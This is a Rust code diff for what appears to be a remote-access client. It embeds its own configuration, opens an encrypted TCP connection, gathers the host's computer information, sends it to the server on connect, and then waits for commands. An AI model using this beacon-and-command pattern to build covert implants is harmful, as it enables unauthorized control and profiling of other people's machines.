@@ -11,7 +11,7 @@ use aes_gcm::aead::consts::U32;
 use aes_gcm::aead::generic_array::GenericArray;
 use aes_gcm::aead::{Aead, KeyInit};
 use aes_gcm::{Aes256Gcm, Key, Nonce};
-use shared::commands::{BaseCommand, Command};
+use shared::commands::{BaseCommand, BaseResponse, Command};
 use shared::crypto::Encryption;
 use shared::types::ClientConfig;
 use smol::{
@@ -20,6 +20,10 @@ use smol::{
     net::TcpStream,
 };
 use std::mem::size_of;
+
+use crate::commands::computer_info;
+
+mod commands;
 
 /////////////////////////
 fn config() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
@@ -105,19 +109,19 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         let encryption = Encryption::new(_key);
 
-        // get computer info before anything happen
-        let _ = send(
-            &mut stream,
-            &encryption,
-            bincode::encode_to_vec(
-                BaseCommand {
-                    id: 0,
-                    command: Command::ComputerInfo,
-                },
-                bincode::config::standard(),
-            )
-            .unwrap(),
-        );
+        // send computer info before anything happen
+        if let Ok(res) = computer_info::main().await {
+            let computer_info_payload = BaseResponse {
+                id: 0,
+                success: true,
+                response: res,
+            };
+            let _ = send(
+                &mut stream,
+                &encryption,
+                bincode::encode_to_vec(computer_info_payload, bincode::config::standard()).unwrap(),
+            );
+        }
 
         match wait(stream, encryption).await {
             Ok(_) => {
